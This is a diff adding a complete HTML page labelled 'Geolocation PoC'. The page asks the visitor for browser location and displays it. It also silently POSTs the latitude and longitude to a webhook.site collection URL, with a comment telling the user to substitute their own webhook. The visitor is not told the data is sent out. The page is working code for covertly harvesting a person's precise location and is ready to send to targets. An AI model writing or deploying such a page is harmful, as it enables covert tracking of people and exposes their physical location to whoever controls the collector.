@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Geolocation PoC</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    button {
+      padding: 15px 25px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Geolocation PoC</h1>
+  <button onclick="getLocation()">Get My Location</button>
+
+  <p id="output">Location: Not yet retrieved.</p>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          // Display the location
+          document.getElementById('output').textContent = `Latitude: ${lat}, Longitude: ${lon}`;
+
+          // Send location data to external API (Webhook.site)
+          fetch('https://webhook.site/11f44e56-235f-4edb-954d-73e1048d7070', {  // Ganti dengan URL Webhook kamu
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              latitude: lat,
+              longitude: lon
+            })
+          })
+          .then(response => response.json())
+          .then(data => {
+            console.log('Location logged:', data);
+          })
+          .catch(error => {
+            console.error('Error logging location:', error);
+          });
+        });
+      } else {
+        alert("Geolocation is not supported by this browser.");
+      }
+    }
+  </script>
+</body>
+</html>
